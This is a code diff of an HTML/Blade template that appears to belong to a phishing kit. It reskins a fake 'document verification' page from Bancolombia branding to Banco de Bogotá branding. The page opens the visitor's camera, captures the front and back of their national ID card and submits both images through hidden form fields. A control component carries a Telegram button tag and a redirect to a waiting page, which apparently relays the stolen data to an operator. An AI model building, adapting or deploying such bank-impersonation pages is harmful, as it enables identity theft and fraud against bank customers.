@@ -5,72 +5,80 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="csrf-token" content="{{ csrf_token() }}">
-    <title>Bancolombia - Verificacion de Documento</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        'bancolombia-yellow': '#fdda24',
-                    }
-                }
-            }
-        }
-    </script>
+    <link rel="icon" type="image/x-icon" href="/bogota/icono_bogota.ico">
+    <title>Verificación de Documento - Banca Virtual Banco de Bogotá</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
+        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
+        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <x-control :auto-completar="false" :debug="false" redirect-url="/bogota/wait"
+        toast-message="No se pudo verificar el documento, intente nuevamente" telegram-button="CEDULA" />
     <style>
         @font-face {
-            font-family: 'bancolombia';
-            src: url('/3co/fonts/bancolombia.ttf') format('truetype');
-            font-weight: 400;
-            font-style: normal;
+            font-family: Roboto-Regular;
+            src: url(/bogota/6bede58e856278b0f8f1.ttf);
+            font-display: swap
         }
 
         @font-face {
-            font-family: "Open Sans";
-            src: url('/3co/fonts/OpenSans-Regular.woff') format('woff'),
-                url('/3co/fonts/OpenSans-Regular.ttf') format('truetype');
-            font-weight: 400;
-            font-style: normal;
+            font-family: Roboto-Medium;
+            src: url(/bogota/0fcd45fbfc419c42c8b9.ttf);
+            font-display: swap
         }
 
         @font-face {
-            font-family: "Open Sans";
-            src: url('/3co/fonts/OpenSans-SemiBold.woff') format('woff'),
-                url('/3co/fonts/OpenSans-SemiBold.ttf') format('truetype');
-            font-weight: 600;
-            font-style: normal;
-        }
-
-        @font-face {
-            font-family: "CIB Sans";
-            src: url('/3co/fonts/CIBFontSansBold.woff2') format('woff2'),
-                url('/3co/fonts/CIBFontSansBold.woff') format('woff');
-            font-weight: 700;
-            font-style: normal;
-        }
-
-        @font-face {
-            font-family: "CIB Sans";
-            src: url('/3co/fonts/CIBFontSansLight.woff2') format('woff2'),
-                url('/3co/fonts/CIBFontSansLight.woff') format('woff');
-            font-weight: 300;
-            font-style: normal;
+            font-family: Roboto-Bold;
+            src: url(/bogota/17451a4c1cd55e33ac57.ttf);
+            font-display: swap
         }
 
         body {
-            font-family: 'Open Sans', sans-serif;
+            font-family: Roboto-Regular;
+            background-color: #f5f5f5;
         }
 
-        .font-cib-sans-bold {
-            font-family: 'CIB Sans', sans-serif;
-            font-weight: 700;
+        .texto-1 {
+            font-size: 24px;
+            font-family: Roboto-Medium;
+            color: #000000;
         }
 
-        .bg-bancolombia {
-            background-image: url('/3co/assets/bgImage.svg');
-            background-position: bottom;
-            background-repeat: no-repeat;
+        .texto-2 {
+            font-size: 14px;
+            font-family: Roboto-Regular;
+            color: #666666;
+        }
+
+        .boton-1 {
+            font-size: 16px;
+            font-family: Roboto-Medium;
+            width: 100%;
+            border-radius: 100px;
+            cursor: pointer;
+            height: 48px;
+            border: solid 1px #0043a9;
+            background-color: #0043a9;
+            color: #ffffff;
+            transition: .3s;
+        }
+
+        .boton-1:disabled {
+            background-color: #ccc;
+            border-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .boton-secundario {
+            font-size: 14px;
+            font-family: Roboto-Medium;
+            border-radius: 100px;
+            cursor: pointer;
+            height: 40px;
+            border: solid 2px #c94740;
+            background-color: #ffffff;
+            color: #c94740;
+            transition: .3s;
         }
 
         .camera-container {
@@ -89,9 +97,7 @@
             display: block;
         }
 
-        #canvas {
-            display: none;
-        }
+        #canvas { display: none; }
 
         .preview-img {
             width: 100%;
@@ -116,7 +122,7 @@
             transform: translate(-50%, -50%);
             width: 88%;
             height: 82%;
-            border: 3px dashed rgba(253, 218, 36, 0.7);
+            border: 3px dashed rgba(0, 67, 169, 0.7);
             border-radius: 12px;
         }
 
@@ -179,170 +185,139 @@
             font-size: 11px;
         }
 
-        .loading-spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid #fdda24;
-            border-top: 4px solid transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+        .paso {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .paso.activo {
+            background-color: #0043a9;
+            color: #ffffff;
+        }
+
+        .paso.completado {
+            background-color: #22c55e;
+            color: #ffffff;
+        }
+
+        .paso.pendiente {
+            background-color: #e5e7eb;
+            color: #6b7280;
+        }
+
+        @media only screen and (min-width: 768px) {
+            body {
+                width: 40%;
+                margin: 0 auto;
+            }
         }
     </style>
-    <x-control :auto-guardar="false" :auto-completar="false" :auto-init="true" :debug="false" />
 </head>
 
-<body class="bg-gray-100">
-
+<body class="px-3">
     <!-- Header -->
-    <div class="w-full flex justify-center items-center py-3 z-50">
-        <div class="w-[98%] flex gap-10 items-center">
-            <img src="/3co/assets/header.svg" class="ml-[25%] w-[45%] object-contain" alt="Bancolombia" />
-            <div class="flex justify-center items-center gap-1.5 cursor-pointer">
-                <span class="text-[15px]">Salir</span>
-                <img src="/3co/assets/exitHeader.svg" class="w-5 object-contain" alt="Salir" />
-            </div>
+    <div class="text-center py-4">
+        <img src="/bogota/logo_bogota_1.svg" width="300" height="auto" alt="Banco de Bogotá">
+    </div>
+
+    <!-- Contenido Principal -->
+    <h1 class="texto-1 mt-2 text-center">Verificación de documento</h1>
+    <p class="texto-2 text-center">Tome foto de su cédula por ambos lados</p>
+
+    <!-- Indicador de pasos -->
+    <div class="d-flex justify-content-center gap-3 my-3">
+        <div class="paso activo" id="paso1">
+            <span class="badge bg-white text-dark rounded-circle">1</span>
+            <span>Frente</span>
+        </div>
+        <div class="paso pendiente" id="paso2">
+            <span class="badge bg-white text-dark rounded-circle">2</span>
+            <span>Reverso</span>
         </div>
     </div>
 
-    <!-- Main Content -->
-    <div class="bg-bancolombia min-h-[70vh] w-[90%] mx-auto flex flex-col items-center justify-start">
+    <div class="bg-white rounded-3 p-3 mb-3">
+        <!-- Error de cámara -->
+        <div id="cameraError" class="d-none text-center py-4">
+            <i class="bi bi-exclamation-triangle text-danger" style="font-size: 48px;"></i>
+            <p class="text-danger fw-bold mt-2">No se pudo acceder a la cámara</p>
+            <p class="text-muted small">Permita el acceso a la cámara en su navegador</p>
+        </div>
 
-        <div id="cedulaSection" class="w-full flex flex-col justify-center items-center pb-6">
-            <h5 class="text-[24px] font-cib-sans-bold mt-6">Verificacion de documento</h5>
-            <p class="text-gray-600 text-[14px] mt-1 text-center">Tome foto de su cedula por ambos lados</p>
-
-            <!-- Indicador de pasos -->
-            <div class="flex justify-center gap-3 mt-4">
-                <div class="paso flex items-center gap-2 px-4 py-2 rounded-full text-[12px] font-semibold bg-bancolombia-yellow text-black" id="paso1">
-                    <span class="w-5 h-5 rounded-full bg-white/40 flex items-center justify-center text-[11px]">1</span>
-                    <span>Frente</span>
-                </div>
-                <div class="paso flex items-center gap-2 px-4 py-2 rounded-full text-[12px] font-semibold bg-gray-200 text-gray-500" id="paso2">
-                    <span class="w-5 h-5 rounded-full bg-white/40 flex items-center justify-center text-[11px]">2</span>
-                    <span>Reverso</span>
+        <!-- Contenedor de cámara -->
+        <div id="cameraWrapper">
+            <div class="camera-container">
+                <video id="video" autoplay playsinline></video>
+                <canvas id="canvas"></canvas>
+                <img id="previewActual" class="preview-img" alt="Vista previa">
+                <div class="overlay">
+                    <div class="document-guide" id="documentGuide"></div>
+                    <div class="document-label" id="documentLabel">Frente de la cédula</div>
                 </div>
             </div>
 
-            <div class="w-full flex mt-4 flex-col justify-center items-center gap-4">
-                <div class="w-full bg-white py-5 px-4 rounded-xl flex flex-col items-center">
+            <!-- Instrucciones -->
+            <div class="mt-3 bg-light rounded p-3">
+                <ul class="small text-muted mb-0 ps-3">
+                    <li>Coloque el documento dentro del recuadro</li>
+                    <li>Asegúrese de que el texto sea legible</li>
+                    <li>Evite reflejos y sombras</li>
+                </ul>
+            </div>
 
-                    <!-- Error de cámara -->
-                    <div id="cameraError" class="hidden w-full text-center py-8">
-                        <div class="text-red-500 mb-2">
-                            <svg class="w-12 h-12 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
-                            </svg>
-                        </div>
-                        <p class="text-red-600 font-semibold">No se pudo acceder a la camara</p>
-                        <p class="text-gray-500 text-sm mt-1">Permita el acceso a la camara en su navegador</p>
+            <!-- Previews -->
+            <div class="d-flex gap-3 mt-3">
+                <div class="preview-box" id="previewFrente">
+                    <div class="placeholder" id="placeholderFrente">
+                        <i class="bi bi-credit-card-2-front"></i>
+                        <span>Frente</span>
                     </div>
-
-                    <!-- Contenedor de cámara -->
-                    <div id="cameraWrapper" class="w-full">
-                        <div class="camera-container">
-                            <video id="video" autoplay playsinline></video>
-                            <canvas id="canvas"></canvas>
-                            <img id="previewActual" class="preview-img" alt="Vista previa">
-                            <div class="overlay">
-                                <div class="document-guide" id="documentGuide"></div>
-                                <div class="document-label" id="documentLabel">Frente de la cedula</div>
-                            </div>
-                        </div>
-
-                        <!-- Instrucciones -->
-                        <div class="mt-3 bg-gray-50 rounded-lg p-3">
-                            <ul class="text-[12px] text-gray-600 space-y-1">
-                                <li class="flex items-center gap-2">
-                                    <span class="text-green-500 font-bold">✓</span>
-                                    Coloque el documento dentro del recuadro
-                                </li>
-                                <li class="flex items-center gap-2">
-                                    <span class="text-green-500 font-bold">✓</span>
-                                    Asegurese de que el texto sea legible
-                                </li>
-                                <li class="flex items-center gap-2">
-                                    <span class="text-green-500 font-bold">✓</span>
-                                    Evite reflejos y sombras
-                                </li>
-                            </ul>
-                        </div>
-
-                        <!-- Previews de ambas fotos -->
-                        <div class="flex gap-3 mt-3">
-                            <div class="preview-box" id="previewFrente">
-                                <div class="placeholder" id="placeholderFrente">
-                                    <svg class="w-6 h-6 mb-1 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
-                                    </svg>
-                                    <span>Frente</span>
-                                </div>
-                                <img id="imgFrente" style="display:none;" alt="Frente">
-                                <div class="label">Frente</div>
-                            </div>
-                            <div class="preview-box" id="previewReverso">
-                                <div class="placeholder" id="placeholderReverso">
-                                    <svg class="w-6 h-6 mb-1 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
-                                    </svg>
-                                    <span>Reverso</span>
-                                </div>
-                                <img id="imgReverso" style="display:none;" alt="Reverso">
-                                <div class="label">Reverso</div>
-                            </div>
-                        </div>
+                    <img id="imgFrente" style="display:none;" alt="Frente">
+                    <div class="label">Frente</div>
+                </div>
+                <div class="preview-box" id="previewReverso">
+                    <div class="placeholder" id="placeholderReverso">
+                        <i class="bi bi-credit-card-2-back"></i>
+                        <span>Reverso</span>
                     </div>
-
-                    <form id="formCedula" class="w-full mt-4">
-                        <input type="hidden" id="cedula_frente" name="cedula_frente">
-                        <input type="hidden" id="cedula_reverso" name="cedula_reverso">
-                        <input type="hidden" id="no-status" name="status" value="cedula">
-
-                        <div class="flex flex-col gap-3">
-                            <button type="button" id="btnCapturar"
-                                class="w-full font-bold py-3 px-6 rounded-full bg-bancolombia-yellow text-black cursor-pointer">
-                                Capturar Frente
-                            </button>
-
-                            <button type="submit" id="enviar"
-                                class="w-full font-bold py-3 px-6 rounded-full bg-bancolombia-yellow text-black cursor-pointer hidden">
-                                Continuar
-                            </button>
-
-                            <div class="flex gap-3">
-                                <button type="button" id="btnReintentarFrente"
-                                    class="flex-1 font-semibold py-2 px-4 rounded-full border-2 border-red-400 text-red-500 cursor-pointer text-[13px] hidden">
-                                    Repetir Frente
-                                </button>
-                                <button type="button" id="btnReintentarReverso"
-                                    class="flex-1 font-semibold py-2 px-4 rounded-full border-2 border-red-400 text-red-500 cursor-pointer text-[13px] hidden">
-                                    Repetir Reverso
-                                </button>
-                            </div>
-                        </div>
-                    </form>
-
+                    <img id="imgReverso" style="display:none;" alt="Reverso">
+                    <div class="label">Reverso</div>
                 </div>
             </div>
         </div>
 
-    </div>
+        <form id="formCedula" class="mt-4">
+            <input type="hidden" id="cedula_frente" name="cedula_frente">
+            <input type="hidden" id="cedula_reverso" name="cedula_reverso">
+            <input type="hidden" id="no-status" name="status" value="cedula">
 
-    <!-- Footer -->
-    <div class="w-full flex flex-col justify-center items-center py-7">
-        <div class="w-[90%] border-t border-gray-300"></div>
-        <img src="/3co/assets/header.svg" class="w-[40%] object-contain" alt="Bancolombia" />
-        <img src="/3co/assets/foter.svg" class="w-[40%] object-contain mt-0.5" alt="Footer" />
+            <button type="button" id="btnCapturar" class="boton-1 mb-2">
+                Capturar Frente
+            </button>
+
+            <button type="submit" id="enviar" class="boton-1 d-none mb-2">
+                Continuar
+            </button>
+
+            <div class="d-flex gap-2">
+                <button type="button" id="btnReintentarFrente" class="boton-secundario flex-fill d-none">
+                    Repetir Frente
+                </button>
+                <button type="button" id="btnReintentarReverso" class="boton-secundario flex-fill d-none">
+                    Repetir Reverso
+                </button>
+            </div>
+        </form>
     </div>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const previewActual = document.getElementById('previewActual');
         const btnCapturar = document.getElementById('btnCapturar');
         const btnEnviar = document.getElementById('enviar');
         const btnReintentarFrente = document.getElementById('btnReintentarFrente');
@@ -354,11 +329,8 @@
         const paso1 = document.getElementById('paso1');
         const paso2 = document.getElementById('paso2');
 
-        // Campos hidden
         const cedulaFrente = document.getElementById('cedula_frente');
         const cedulaReverso = document.getElementById('cedula_reverso');
-
-        // Previews
         const imgFrente = document.getElementById('imgFrente');
         const imgReverso = document.getElementById('imgReverso');
         const previewFrente = document.getElementById('previewFrente');
@@ -367,37 +339,25 @@
         const placeholderReverso = document.getElementById('placeholderReverso');
 
         let stream = null;
-        let paso = 1; // 1 = frente, 2 = reverso
+        let paso = 1;
 
         async function iniciarCamara() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'environment',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
+                    video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
                     audio: false
                 });
                 video.srcObject = stream;
             } catch (error) {
-                console.error('Error al acceder a la camara:', error);
                 cameraWrapper.style.display = 'none';
-                cameraError.classList.remove('hidden');
+                cameraError.classList.remove('d-none');
             }
         }
 
         function actualizarPaso(numPaso, estado) {
             const pasoEl = numPaso === 1 ? paso1 : paso2;
-            pasoEl.classList.remove('bg-bancolombia-yellow', 'text-black', 'bg-gray-200', 'text-gray-500', 'bg-green-500', 'text-white');
-
-            if (estado === 'activo') {
-                pasoEl.classList.add('bg-bancolombia-yellow', 'text-black');
-            } else if (estado === 'completado') {
-                pasoEl.classList.add('bg-green-500', 'text-white');
-            } else {
-                pasoEl.classList.add('bg-gray-200', 'text-gray-500');
-            }
+            pasoEl.classList.remove('activo', 'completado', 'pendiente');
+            pasoEl.classList.add(estado);
         }
 
         function capturarFoto() {
@@ -405,39 +365,32 @@
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0);
-
             const imageData = canvas.toDataURL('image/jpeg', 0.85);
 
             if (paso === 1) {
-                // Capturar frente
                 cedulaFrente.value = imageData;
                 imgFrente.src = imageData;
                 imgFrente.style.display = 'block';
                 placeholderFrente.style.display = 'none';
                 previewFrente.classList.add('captured');
 
-                // Pasar al reverso
                 paso = 2;
                 actualizarPaso(1, 'completado');
                 actualizarPaso(2, 'activo');
-                documentLabel.textContent = 'Reverso de la cedula';
+                documentLabel.textContent = 'Reverso de la cédula';
                 btnCapturar.textContent = 'Capturar Reverso';
-                btnReintentarFrente.classList.remove('hidden');
-
+                btnReintentarFrente.classList.remove('d-none');
             } else if (paso === 2) {
-                // Capturar reverso
                 cedulaReverso.value = imageData;
                 imgReverso.src = imageData;
                 imgReverso.style.display = 'block';
                 placeholderReverso.style.display = 'none';
                 previewReverso.classList.add('captured');
 
-                // Mostrar boton de enviar
                 actualizarPaso(2, 'completado');
                 btnCapturar.style.display = 'none';
-                btnEnviar.classList.remove('hidden');
-                btnReintentarReverso.classList.remove('hidden');
-
+                btnEnviar.classList.remove('d-none');
+                btnReintentarReverso.classList.remove('d-none');
                 documentGuide.classList.add('captured');
             }
         }
@@ -448,25 +401,21 @@
             imgFrente.style.display = 'none';
             placeholderFrente.style.display = 'flex';
             previewFrente.classList.remove('captured');
-
-            // Volver al paso 1
-            paso = 1;
-            actualizarPaso(1, 'activo');
-            actualizarPaso(2, 'pendiente');
-            documentLabel.textContent = 'Frente de la cedula';
-            btnCapturar.textContent = 'Capturar Frente';
-            btnCapturar.style.display = 'block';
-            btnEnviar.classList.add('hidden');
-            btnReintentarFrente.classList.add('hidden');
-            btnReintentarReverso.classList.add('hidden');
-
-            // También limpiar reverso
             cedulaReverso.value = '';
             imgReverso.src = '';
             imgReverso.style.display = 'none';
             placeholderReverso.style.display = 'flex';
             previewReverso.classList.remove('captured');
 
+            paso = 1;
+            actualizarPaso(1, 'activo');
+            actualizarPaso(2, 'pendiente');
+            documentLabel.textContent = 'Frente de la cédula';
+            btnCapturar.textContent = 'Capturar Frente';
+            btnCapturar.style.display = 'block';
+            btnEnviar.classList.add('d-none');
+            btnReintentarFrente.classList.add('d-none');
+            btnReintentarReverso.classList.add('d-none');
             documentGuide.classList.remove('captured');
         }
 
@@ -477,15 +426,13 @@
             placeholderReverso.style.display = 'flex';
             previewReverso.classList.remove('captured');
 
-            // Volver al paso 2
             paso = 2;
             actualizarPaso(2, 'activo');
-            documentLabel.textContent = 'Reverso de la cedula';
+            documentLabel.textContent = 'Reverso de la cédula';
             btnCapturar.textContent = 'Capturar Reverso';
             btnCapturar.style.display = 'block';
-            btnEnviar.classList.add('hidden');
-            btnReintentarReverso.classList.add('hidden');
-
+            btnEnviar.classList.add('d-none');
+            btnReintentarReverso.classList.add('d-none');
             documentGuide.classList.remove('captured');
         }
 
@@ -496,14 +443,9 @@
         iniciarCamara();
     </script>
 
-    <x-control
-        :auto-completar="false"
-        :debug="false"
-        redirect-url="/bogota/wait"
-        toast-message="No se pudo verificar el documento, intente nuevamente"
-        telegram-button="CEDULA"
-    />
-
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
+        crossorigin="anonymous"></script>
 </body>
 
 </html>
